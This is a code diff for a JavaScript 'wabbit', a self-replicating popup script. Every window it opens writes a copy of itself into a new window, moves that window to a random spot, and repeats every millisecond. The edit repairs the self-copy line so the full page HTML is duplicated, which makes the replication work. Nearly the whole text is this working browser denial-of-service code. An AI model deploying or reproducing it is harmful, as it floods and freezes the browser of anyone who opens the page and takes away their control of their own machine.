@@ -3,7 +3,7 @@
 
 function createWabbit() { //Create a very similar clone window, with code to clone itself.
   var wabbit = window.open('','','width = 200,height = 200');
-  wabbit.document.write('<!DOCTYPE html><html><head><title>Wha-</title></head><body><script>function createWabbit() {var wabbit = window.open("","","width = 200,height = 200");wabbit.document.write(document.documentElement);wabbit.moveTo((Math.random()*screen.width),(Math.random()*screen.height));}; setInterval(createWabbit,1);</script>Wha-</body></html>');
+  wabbit.document.write('<!DOCTYPE html><html><head><title>Wha-</title></head><body><script>function createWabbit() {var wabbit = window.open("","","width = 200,height = 200");wabbit.document.write("<html>".concat(document.documentElement.innerHTML).concat("</html>"));wabbit.moveTo((Math.random()*screen.width),(Math.random()*screen.height));}; setInterval(createWabbit,1);</script>Wha-</body></html>');
   wabbit.moveTo((Math.random()*screen.width),(Math.random()*screen.height));
   wabbitsMade = wabbitsMade + 1;
 }
